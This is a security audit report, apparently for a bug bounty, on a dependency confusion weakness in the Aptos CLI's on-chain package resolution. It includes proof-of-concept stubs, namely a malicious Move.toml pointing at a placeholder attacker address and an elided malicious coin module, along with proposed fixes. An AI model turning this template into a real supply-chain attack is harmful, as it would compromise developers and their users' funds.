# Audit Report

## Title
Dependency Confusion Attack via Unvalidated Custom Package Resolution

## Summary
The hardcoded 'aptos' key in `custom_dependency_key()` does not prevent namespace collisions. Attackers can deploy malicious packages with identical names to official Aptos packages at arbitrary addresses, enabling dependency confusion attacks that compromise the Move package supply chain.

## Finding Description

The Aptos CLI package system allows developers to specify on-chain package dependencies using the custom `aptos` key in `Move.toml`: [1](#0-0) 

This key is used during dependency resolution to identify Aptos blockchain dependencies: [2](#0-1) 

When the manifest parser encounters an `aptos` dependency, it extracts the node URL and package address without any validation. The system then downloads the package from the blockchain at the specified address: [3](#0-2) 

**Critical Flaw**: There is **no verification** that:
1. The package address corresponds to the official/canonical source for that package name
2. The package is signed or authenticated
3. The package name at that address is authoritative

The on-chain `PackageRegistry` allows **anyone** to publish packages with **any name** at their own address, subject only to having publishing permission on that address: [4](#0-3) 

Notably, the `check_dependencies` function validates upgrade policies and dependency existence, but **does not validate** whether an address is the canonical/official source for a package name: [5](#0-4) 

**Attack Scenario**:
1. Attacker deploys a malicious package named "AptosFramework" at address `0xATTACKER` (instead of the official `0x1`)
2. Attacker distributes malicious documentation/tutorials instructing developers to use:
   ```toml
   [dependencies]
   AptosFramework = { aptos = "https://fullnode.mainnet.aptoslabs.com", address = "0xATTACKER" }
   ```
3. Developer's Aptos CLI downloads the malicious package from `0xATTACKER` during build
4. Malicious code compiles into the developer's package
5. If deployed, the compromised package could steal funds, leak private keys, or introduce backdoors

## Impact Explanation

This is a **MEDIUM severity** vulnerability per the Aptos bug bounty program criteria:
- **Limited funds loss or manipulation**: Compromised packages could steal user funds if they handle assets
- **Supply chain attack**: Affects the integrity of the Move package ecosystem
- **State inconsistencies**: Malicious dependencies could introduce non-deterministic behavior causing consensus issues

The impact is limited to MEDIUM rather than CRITICAL because:
- Requires social engineering to trick developers
- Does not directly compromise validator nodes or consensus
- Requires developer to deploy the compromised code
- Can be detected during code review

However, successful exploitation could lead to:
- Theft of user funds from compromised dApps
- Backdoors in deployed Move modules
- Private key exfiltration during build/deployment
- Consensus violations if malicious code causes non-deterministic execution

## Likelihood Explanation

**MEDIUM likelihood** because:
- Attackers can trivially deploy packages with any name at their own address (no technical barrier)
- Developers, especially newcomers, may copy dependency configurations from unofficial sources
- The official documentation often shows git dependencies, creating confusion about the correct format
- No warning is displayed when downloading packages from non-standard addresses
- Package names alone (like "AptosFramework", "AptosStdlib") appear legitimate

Attack complexity is LOW:
1. Deploy malicious package on-chain (simple transaction)
2. Distribute malicious tutorial/documentation (social engineering)
3. Wait for developers to build with malicious dependency

## Recommendation

Implement multiple defense layers:

**1. Package Name Registry** - Maintain an authoritative mapping of critical package names to canonical addresses:

```rust
// In package_hooks.rs
const OFFICIAL_PACKAGES: &[(&str, &str)] = &[
    ("AptosFramework", "0x1"),
    ("AptosStdlib", "0x1"),
    ("AptosToken", "0x3"),
    // ... other official packages
];

fn validate_package_source(package_name: &str, address: &str) -> anyhow::Result<()> {
    for (name, official_addr) in OFFICIAL_PACKAGES {
        if package_name == *name && address != *official_addr {
            bail!(
                "WARNING: Package '{}' is being resolved from address {} \
                instead of the official address {}. This may be a dependency confusion attack.",
                package_name, address, official_addr
            );
        }
    }
    Ok(())
}
```

**2. Validate in `resolve_custom_dependency`**:

```rust
fn resolve_custom_dependency(
    &self,
    dep_name: Symbol,
    info: &CustomDepInfo,
) -> anyhow::Result<()> {
    // Validate package source
    validate_package_source(
        dep_name.as_str(),
        info.package_address.as_str()
    )?;
    
    block_on(maybe_download_package(info))
}
```

**3. Add package signing/verification** - Implement cryptographic signatures for official packages that are verified during download.

**4. Display warnings** - Always display the address when downloading packages and warn for non-standard addresses.

## Proof of Concept

**Step 1: Deploy malicious package**

```move
// malicious_framework.move
module 0xATTACKER::coin {
    // Looks like legitimate coin module but exfiltrates to attacker
    public fun transfer<CoinType>(
        from: &signer,
        to: address,
        amount: u64,
    ) {
        // Malicious: also send to attacker
        let attacker_addr = @0xATTACKER;
        // ... malicious logic ...
    }
}
```

**Step 2: Create malicious Move.toml for victim**

```toml
[package]
name = "VictimPackage"
version = "1.0.0"

[dependencies]
# Malicious - points to attacker's package
AptosFramework = { aptos = "https://fullnode.mainnet.aptoslabs.com", address = "0xATTACKER" }

[addresses]
victim = "_"
```

**Step 3: Victim builds package**

```bash
$ aptos move compile --package-dir ./victim_package
# Aptos CLI downloads "AptosFramework" from 0xATTACKER
# Compiles with malicious dependency
# No warning is displayed
```

**Step 4: Verification script**

```rust
// test_dependency_confusion.rs
#[test]
fn test_dependency_confusion() {
    // Create two packages with same name at different addresses
    let official_addr = AccountAddress::from_hex_literal("0x1").unwrap();
    let attacker_addr = AccountAddress::from_hex_literal("0xDEADBEEF").unwrap();
    
    // Both can have "AptosFramework" name
    let official_pkg = create_package("AptosFramework", official_addr);
    let attacker_pkg = create_package("AptosFramework", attacker_addr);
    
    // System accepts both - NO VALIDATION
    assert!(can_resolve_package("AptosFramework", official_addr));
    assert!(can_resolve_package("AptosFramework", attacker_addr)); // VULNERABILITY
}
```

## Notes

The vulnerability exists because the `aptos` custom dependency key provides **mechanism** (how to fetch packages from blockchain) but no **policy** (which addresses are authoritative for which package names). This violates the principle that critical infrastructure packages should have authenticated, canonical sources. The fix requires implementing a package name → address registry with validation at download time.

### Citations

**File:** crates/aptos/src/move_tool/package_hooks.rs (L25-27)
```rust
    fn custom_dependency_key(&self) -> Option<String> {
        Some("aptos".to_string())
    }
```

**File:** crates/aptos/src/move_tool/package_hooks.rs (L38-54)
```rust
async fn maybe_download_package(info: &CustomDepInfo) -> anyhow::Result<()> {
    if !info
        .download_to
        .join(CompiledPackageLayout::BuildInfo.path())
        .exists()
    {
        let registry = CachedPackageRegistry::create(
            Url::parse(info.node_url.as_str())?,
            load_account_arg(info.package_address.as_str())?,
            false,
        )
        .await?;
        let package = registry.get_package(info.package_name).await?;
        package.save_package_to_disk(info.download_to.as_path())
    } else {
        Ok(())
    }
```

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L392-424)
```rust
                (None, None, Some(custom_key)) => {
                    let package_name = Symbol::from(dep_name);
                    let address = match table.remove("address") {
                        None => bail!("Address not supplied for 'node' dependency"),
                        Some(r) => Symbol::from(
                            r.as_str()
                                .ok_or_else(|| format_err!("Node address not a string"))?,
                        ),
                    };
                    // Downloaded packages are of the form <sanitized_node_url>_<address>_<package>
                    let node_url = custom_key
                        .as_str()
                        .ok_or_else(|| anyhow::anyhow!("Git URL not a string"))?;
                    let local_path = PathBuf::from(MOVE_HOME.clone()).join(format!(
                        "{}_{}_{}",
                        url_to_file_name(node_url),
                        address,
                        package_name
                    ));
                    node_info = Some(PM::CustomDepInfo {
                        node_url: Symbol::from(node_url),
                        package_address: address,
                        package_name,
                        download_to: local_path.clone(),
                    });
                    Ok(PM::Dependency {
                        subst,
                        version,
                        digest,
                        local: local_path,
                        git_info,
                        node_info,
                    })
```

**File:** aptos-move/framework/aptos-framework/sources/code.move (L168-228)
```text
    public fun publish_package(owner: &signer, pack: PackageMetadata, code: vector<vector<u8>>) acquires PackageRegistry {
        check_code_publishing_permission(owner);
        // Disallow incompatible upgrade mode. Governance can decide later if this should be reconsidered.
        assert!(
            pack.upgrade_policy.policy > upgrade_policy_arbitrary().policy,
            error::invalid_argument(EINCOMPATIBLE_POLICY_DISABLED),
        );

        let addr = signer::address_of(owner);
        if (!exists<PackageRegistry>(addr)) {
            move_to(owner, PackageRegistry { packages: vector::empty() })
        };

        // Checks for valid dependencies to other packages
        let allowed_deps = check_dependencies(addr, &pack);

        // Check package against conflicts
        // To avoid prover compiler error on spec
        // the package need to be an immutable variable
        let module_names = get_module_names(&pack);
        let package_immutable = &borrow_global<PackageRegistry>(addr).packages;
        let len = vector::length(package_immutable);
        let index = len;
        let upgrade_number = 0;
        vector::enumerate_ref(package_immutable
        , |i, old| {
            let old: &PackageMetadata = old;
            if (old.name == pack.name) {
                upgrade_number = old.upgrade_number + 1;
                check_upgradability(old, &pack, &module_names);
                index = i;
            } else {
                check_coexistence(old, &module_names)
            };
        });

        // Assign the upgrade counter.
        pack.upgrade_number = upgrade_number;

        let packages = &mut borrow_global_mut<PackageRegistry>(addr).packages;
        // Update registry
        let policy = pack.upgrade_policy;
        if (index < len) {
            *vector::borrow_mut(packages, index) = pack
        } else {
            vector::push_back(packages, pack)
        };

        event::emit(PublishPackage {
            code_address: addr,
            is_upgrade: upgrade_number > 0
        });

        // Request publish
        if (features::code_dependency_check_enabled())
            request_publish_with_allowed_deps(addr, module_names, allowed_deps, code, policy.policy)
        else
        // The new `request_publish_with_allowed_deps` has not yet rolled out, so call downwards
        // compatible code.
            request_publish(addr, module_names, code, policy.policy)
    }
```

**File:** aptos-move/framework/aptos-framework/sources/code.move (L298-344)
```text
    fun check_dependencies(publish_address: address, pack: &PackageMetadata): vector<AllowedDep>
    acquires PackageRegistry {
        let allowed_module_deps = vector::empty();
        let deps = &pack.deps;
        vector::for_each_ref(deps, |dep| {
            let dep: &PackageDep = dep;
            assert!(exists<PackageRegistry>(dep.account), error::not_found(EPACKAGE_DEP_MISSING));
            if (is_policy_exempted_address(dep.account)) {
                // Allow all modules from this address, by using "" as a wildcard in the AllowedDep
                let account: address = dep.account;
                let module_name = string::utf8(b"");
                vector::push_back(&mut allowed_module_deps, AllowedDep { account, module_name });
            } else {
                let registry = borrow_global<PackageRegistry>(dep.account);
                let found = vector::any(&registry.packages, |dep_pack| {
                    let dep_pack: &PackageMetadata = dep_pack;
                    if (dep_pack.name == dep.package_name) {
                        // Check policy
                        assert!(
                            dep_pack.upgrade_policy.policy >= pack.upgrade_policy.policy,
                            error::invalid_argument(EDEP_WEAKER_POLICY)
                        );
                        if (dep_pack.upgrade_policy == upgrade_policy_arbitrary()) {
                            assert!(
                                dep.account == publish_address,
                                error::invalid_argument(EDEP_ARBITRARY_NOT_SAME_ADDRESS)
                            )
                        };
                        // Add allowed deps
                        let account = dep.account;
                        let k = 0;
                        let r = vector::length(&dep_pack.modules);
                        while (k < r) {
                            let module_name = vector::borrow(&dep_pack.modules, k).name;
                            vector::push_back(&mut allowed_module_deps, AllowedDep { account, module_name });
                            k = k + 1;
                        };
                        true
                    } else {
                        false
                    }
                });
                assert!(found, error::not_found(EPACKAGE_DEP_MISSING));
            };
        });
        allowed_module_deps
    }
```
